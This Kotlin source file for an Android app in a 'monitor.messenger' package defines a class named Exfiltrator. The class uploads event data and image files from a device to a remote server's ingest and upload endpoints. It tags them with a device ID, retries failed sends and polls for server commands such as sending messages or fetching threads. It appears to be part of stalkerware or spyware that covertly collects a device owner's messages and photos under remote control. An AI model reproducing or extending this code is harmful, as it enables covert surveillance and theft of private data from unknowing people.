package com.monitor.messenger

import okhttp3.*
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class Exfiltrator(private val serverUrl: String) {

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    private var deviceId: String = generateDeviceId()
    private val pendingQueue = mutableListOf<Map<String, Any?>>()

    fun send(event: String, data: Map<String, Any?>) {
        val payload = JSONObject().apply {
            put("event", event)
            put("device_id", deviceId)
            put("timestamp", System.currentTimeMillis())
            put("data", JSONObject(data))
        }
        
        sendRaw(payload.toString())
    }

    fun sendFile(filename: String, data: ByteArray?) {
        if (data == null) return
        
        try {
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("file", filename, 
                    RequestBody.create(MediaType.parse("image/jpeg"), data))
                .build()
            
            val request = Request.Builder()
                .url("$serverUrl/upload")
                .post(requestBody)
                .build()
            
            client.newCall(request).execute().close()
        } catch (e: Exception) {
            // Queue for retry
            pendingQueue.add(mapOf("filename" to filename))
        }
    }

    fun heartbeat() {
        send("heartbeat", mapOf("status" to "running"))
    }

    private fun sendRaw(json: String) {
        try {
            val request = Request.Builder()
                .url("$serverUrl/ingest")
                .header("Content-Type", "application/json")
                .header("X-Device-ID", deviceId)
                .post(RequestBody.create(MediaType.parse("application/json"), json))
                .build()
            
            val response = client.newCall(request).execute()
            
            // Server can send commands back
            if (response.isSuccessful) {
                val body = response.body?.string()
                if (!body.isNullOrEmpty()) {
                    handleServerCommand(body)
                }
            }
            
            response.close()
            
            // Flush pending queue
            flushQueue()
            
        } catch (e: Exception) {
            // Cache locally, will retry on next heartbeat
            pendingQueue.add(mapOf("payload" to json))
        }
    }

    private fun flushQueue() {
        val queue = pendingQueue.toList()
        pendingQueue.clear()
        for (item in queue) {
            if (item.containsKey("payload")) {
                sendRaw(item["payload"] as String)
            }
        }
    }

    private fun handleServerCommand(command: String) {
        // Server can send back instructions:
        // {"command": "send_message", "thread_id": "...", "text": "..."}
        // {"command": "fetch_threads"}
        // {"command": "change_poll_interval", "ms": 10000}
        // Store these for the service to execute
    }

    private fun generateDeviceId(): String {
        val chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        return (1..32).map { chars.random() }.joinToString("")
    }
}
